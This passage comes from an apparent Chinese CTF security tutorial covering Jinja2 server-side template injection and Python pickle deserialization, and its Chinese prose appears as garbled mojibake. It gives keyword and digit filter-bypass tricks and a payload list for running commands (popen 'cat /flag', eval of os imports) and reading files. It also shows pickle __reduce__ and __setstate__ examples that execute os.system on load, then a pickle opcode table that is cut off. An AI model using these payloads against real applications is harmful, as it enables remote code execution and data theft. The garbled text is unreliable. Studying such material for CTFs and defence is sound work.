class="code"><pre><span class="line">&#123;&#123;(<span class="built_in">dict</span>(e=a)|join|count&#125;&#125;+&#123;&#123;(<span class="built_in">dict</span>(e=a)|join|count&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½é€šè¿‡<code>1+1</code>æ¥æ„é€ å‡º2</p><p>å¯ä»¥ç”¨å…¨è§’å­—ç¬¦ç»•è¿‡ä¾‹å¦‚å¯ä»¥é€šè¿‡<a class="link" target="_blank" rel="noopener" href="http://www.wetools.com/sbc-case-convert">è¿™ä¸ªç½‘ç«™<i class="fas fa-external-link-alt"></i></a>æ‹¿åˆ°å…¨è§’æ•°å­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™ï¼</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡å…³é”®å­—"><a href="#ç»•è¿‡å…³é”®å­—" class="headerlink" title="ç»•è¿‡å…³é”®å­—"></a>ç»•è¿‡å…³é”®å­—</h5><p><code>class</code>ã€<code>base</code>è¿™ç§å…³é”®è¯è¢«è¿‡æ»¤çš„æƒ…å†µ, é€šå¸¸ä½¿ç”¨joinæ‹¼æ¥å®ç°</p><p>æ¯”å¦‚:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="built_in">dict</span>(__<span class="keyword">in</span>=a,it__=a)|join&#125;&#125;= __init__</span><br></pre></td></tr></table></figure><h3 id="SSTI-payload"><a href="#SSTI-payload" class="headerlink" title="SSTI_payload"></a>SSTI_payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line"><span class="number">2</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">//è¿™ä¸ª<span class="number">138</span>å¯¹åº”çš„ç±»æ˜¯os._wrap_closeï¼Œåªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç±»çš„ç´¢å¼•å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªpayload</span><br><span class="line"><span class="number">3</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="number">4</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx</span><br><span class="line"><span class="number">5</span>ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="number">6</span>ã€æ–‡ä»¶è¯»å–</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br><span class="line">//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx</span><br></pre></td></tr></table></figure><h3 id="pythonååºåˆ—åŒ–"><a href="#pythonååºåˆ—åŒ–" class="headerlink" title="pythonååºåˆ—åŒ–"></a>pythonååºåˆ—åŒ–</h3><p>è¿™éƒ¨åˆ†å‚è€ƒäº†è¿™ä½<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11082">å¤§ä½¬çš„æ–‡ç« <i class="fas fa-external-link-alt"></i></a></p><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªç±»å¯¹è±¡å‘å­—èŠ‚æµè½¬åŒ–ä»è€Œè¿›è¡Œå­˜å‚¨å’Œä¼ è¾“, ç„¶åä½¿ç”¨çš„æ—¶å€™å†å°†å­—èŠ‚æµè½¬æ¢å›åŸå§‹çš„å¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹å’Œphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–å…¶å®å·®ä¸å¤š, pythonä¸­ååºåˆ—åŒ–ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼:<code>pickle</code>å’Œ<code>json</code>æ¨¡å—, å‰è€…æ˜¯pythonç‰¹æœ‰çš„æ ¼å¼, åè€…æ˜¯<code>json</code>é€šç”¨çš„æ ¼å¼</p><p>ç›¸è¾ƒäºphpååºåˆ—åŒ–çš„çµæ´»å¤šæ ·çš„åˆ©ç”¨, pythonååºåˆ—åŒ–ä¸»è¦æ¶‰åŠè¿™ä¹ˆå‡ ä¸ªæ¦‚å¿µ:<code>pickle</code>,<code>pvm</code>,<code>__reduce__</code>é­”æœ¯æ–¹æ³•, æœ¬æ–‡ä¸»è¦æ¥çœ‹<code>pickle</code>æ¨¡å—çš„ååºåˆ—åŒ–æ¼æ´é—®é¢˜</p><p><code>pickle</code>å¯ä»¥ç”¨äºpythonç‰¹æœ‰çš„ç±»å‹å’Œpythonçš„æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢(æ‰€æœ‰pythonæ•°æ®ç±»å‹)</p><p>pythonæä¾›ä¸¤ä¸ªæ¨¡å—å®ç°åºåˆ—åŒ–: <code>cpickle</code>å’Œ<code>pickle</code> è¿™ä¸¤ä¸ªæ¨¡å—åŠŸèƒ½æ˜¯ä¸€æ ·çš„, åŒºåˆ«åœ¨äº<code>cpickle</code>æ˜¯Cè¯­è¨€å†™çš„, é€Ÿåº¦å¿«, <code>pickle</code>æ˜¯pythonå†™çš„, é€Ÿåº¦æ…¢. åœ¨python3ä¸­å·²ç»æ²¡æœ‰<code>cpickle</code>æ¨¡å—, <code>pickle</code>æœ‰å¦‚ä¸‹å››ç§å‡½æ•°æ“ä½œæ–¹æ³•</p><ul><li><code>pickle.dump(obj,file)</code> : å°†å¯¹è±¡åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶</li><li><code>pickle.load(file)</code> : è¯»å–æ–‡ä»¶, å°†æ–‡ä»¶ä¸­çš„åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ä¸ºå¯¹è±¡</li><li><code>pickle.dumps(obj)</code> : å°†å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµ</li><li><code>pickle.loads(bytes_obj)</code> : å°†å­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµååºåˆ—åŒ–ä¸ºå¯¹è±¡</li></ul><p>é­”æœ¯æ–¹æ³•:</p><ul><li><code>reduce()</code> ååºåˆ—åŒ–æ—¶è°ƒç”¨</li><li><code>reduce_ex()</code> ååºåˆ—åŒ–æ—¶è°ƒç”¨</li><li><code>setstate()</code> ååºåˆ—åŒ–æ—¶è°ƒç”¨</li><li><code>getstate()</code> ååºåˆ—åŒ–æ—¶è°ƒç”¨</li></ul><h4 id="ç®€å•å®ç”¨"><a href="#ç®€å•å®ç”¨" class="headerlink" title="ç®€å•å®ç”¨"></a>ç®€å•å®ç”¨</h4><p>ä¾‹å­ä¸€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;charmersix&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;åºåˆ—åŒ–&#x27;</span>)</span><br><span class="line">a = pickle.dumps(Demo())</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ååºåˆ—åŒ–&#x27;</span>)</span><br><span class="line">b = pickle.loads(pickle.dumps(Demo())).name</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230421222208937.png" alt="image-20230421222208937"></p><p>ä¾‹å­äºŒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ååºåˆ—åŒ–è°ƒç”¨&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"><span class="comment">#ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨__reduce__()</span></span><br><span class="line">a = A()</span><br><span class="line"></span><br><span class="line">p_d = pickle.dumps(a)<span class="comment">#åºåˆ—åŒ–</span></span><br><span class="line">pickle.loads(p_d)<span class="comment">#ååºåˆ—åŒ–å¹¶è°ƒç”¨__reduce__</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p_d)</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ç¬¬å…­è¡Œä¸­ï¼Œé€—å·çš„ä½œç”¨æ˜¯å°†å…ƒç»„ä¸­çš„ä¸¤ä¸ªå…ƒç´ åˆ†å¼€ï¼Œä»¥ä¾¿ä½œä¸ºå‚æ•°ä¼ é€’ç»™__reduce__æ–¹æ³•ã€‚è¿™ä¸ªå…ƒç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼ˆå‡½æ•°æˆ–ç±»ï¼‰ï¼Œè€Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå‚æ•°å…ƒç»„ï¼Œå…¶ä¸­åŒ…å«ä¼ é€’ç»™è¯¥å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯os.systemå‡½æ•°ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸²â€™calcâ€™ï¼Œè¡¨ç¤ºå°†åœ¨ååºåˆ—åŒ–æœŸé—´æ‰§è¡Œçš„å‘½ä»¤ã€‚</p></blockquote><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230422165516943.png" alt="image-20230422165516943"></p><p>ä¾‹å­3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self ,name</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">pickle.loads(tmp)<span class="comment">#ååºåˆ—åŒ–å¹¶è°ƒç”¨__setstate__</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230422171046289.png" alt="image-20230422171046289"></p><h4 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h4><h5 id="ç»„æˆéƒ¨åˆ†"><a href="#ç»„æˆéƒ¨åˆ†" class="headerlink" title="ç»„æˆéƒ¨åˆ†"></a>ç»„æˆéƒ¨åˆ†</h5><p>pvmç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ:</p><ul><li>æŒ‡ä»¤å¤„ç†å™¨: ä»æµä¸­è¯»å–<code>opcode</code>å’Œå‚æ•°, å¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†. é‡å¤è¿™ä¸ªåŠ¨ä½œ, ç›´åˆ°é‡åˆ°<code>.</code>è¿™ä¸ªç»“æŸç¬¦ååœæ­¢, æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›</li><li>æ ˆåŒº(stack): ç”±pythonçš„listå®ç°, è¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®/å‚æ•°ä»¥åŠå¯¹è±¡, åœ¨ä¸æ–­çš„è¿›å‡ºæ ˆè¿‡ç¨‹ä¸­å®Œæˆå¯¹æ•°æ®æµçš„ååºåˆ—åŒ–æ“ä½œ, å¹¶æœ€ç»ˆåœ¨æ ˆé¡¶ç”Ÿæˆååºåˆ—åŒ–ç»“æœ</li><li>æ ‡ç­¾åŒº(memo): ç”±pythonçš„dictå®ç°, ä¸ºpvmçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨</li></ul><h5 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h5><p>é¦–å…ˆ, <code>pvm</code>ä¼šæŠŠæºç ç¼–è¯‘æˆå­—èŠ‚ç , å­—èŠ‚ç æ˜¯pythonè¯­è¨€ç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼, å®ƒä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç , éœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ. å¦‚æœpythonè¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™, é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥<code>.pyc</code>ä¸ºæ‰©å±•åçš„æ–‡ä»¶, å¦‚æœæ²¡æœ‰å†™å…¥æƒé™, åˆ™pythonè¿›ç¨‹ä¼šåœ¨å†…å­˜é©¬ä¸­ç”Ÿæˆå­—èŠ‚ç , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ</p><p>ä¸€èˆ¬æ¥è¯´, åœ¨æ„å»ºç¨‹åºæ—¶æœ€å¥½ç»™Pythonè¿›ç¨‹åœ¨ä¸»æœºä¸Šçš„å†™å…¥æƒé™, è¿™æ ·åªè¦æºä»£ç æ²¡æœ‰æ”¹å˜, ç”Ÿæˆçš„<code>.pyc</code>æ–‡ä»¶å°±å¯ä»¥è¢«é‡å¤åˆ©ç”¨, æé«˜æ‰§è¡Œæ•ˆç‡, åŒæ—¶éšè—æºä»£ç </p><p>ç„¶å, Pythonè¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ°<code>PVM</code>(Pythonè™šæ‹Ÿæœº)ä¸­, <code>PVM</code>ä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤, ç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆ</p><h5 id="æŒ‡ä»¤é›†"><a href="#æŒ‡ä»¤é›†" class="headerlink" title="æŒ‡ä»¤é›†"></a>æŒ‡ä»¤é›†</h5><p>è¿™é‡Œè´´ä¸€ä¸‹<a class="link" target="_blank" rel="noopener" href="https://docs.python.org/2/library/pickle.html">å®˜æ–¹æ–‡æ¡£<i class="fas fa-external-link-alt"></i></a></p><p>å½“å‰ç”¨äº<code>pickling</code>çš„åè®®æœ‰6ç§, ä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜, è¯»å–ç”Ÿæˆçš„<code>pickle</code>æ‰€éœ€çš„<code>python</code>ç‰ˆæœ¬è¶Šæ–°</p><ul><li><code>v0</code>ç‰ˆåè®®æ˜¯åŸå§‹çš„äººç±»å¯è¯»åè®®, å¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„python</li><li><code>v1</code>ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼, å®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„pythonå…¼å®¹</li><li><code>v2</code>ç‰ˆåè®®æ˜¯åœ¨python2.3ä¸­å¼•å…¥çš„, å®ƒä¸ºå­˜å‚¨<code>new-style class</code>æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶, å‚é˜…<code>PEP 307</code></li><li><code>v3</code>ç‰ˆåè®®æ·»åŠ äºpython3.0, ä»–å…·æœ‰å¯¹<code>bytes</code>å¯¹è±¡çš„æ˜¾ç¤ºæ”¯æŒ, ä¸”æ— æ³•è¢«<code>python2.x</code>æ‰“å¼€, è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®, ä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»–<code>python3</code>ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®</li><li><code>v4</code>ç‰ˆåè®®æ·»åŠ äºpython3.4, å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡, èƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡, è¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–, å‚é˜…<code>PEP 3154</code></li><li><code>v5</code>ç‰ˆåè®®æ·»åŠ äºpython3.8, å®ƒæ”¯æŒå¤–å¸¦æ•°æ®, åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack 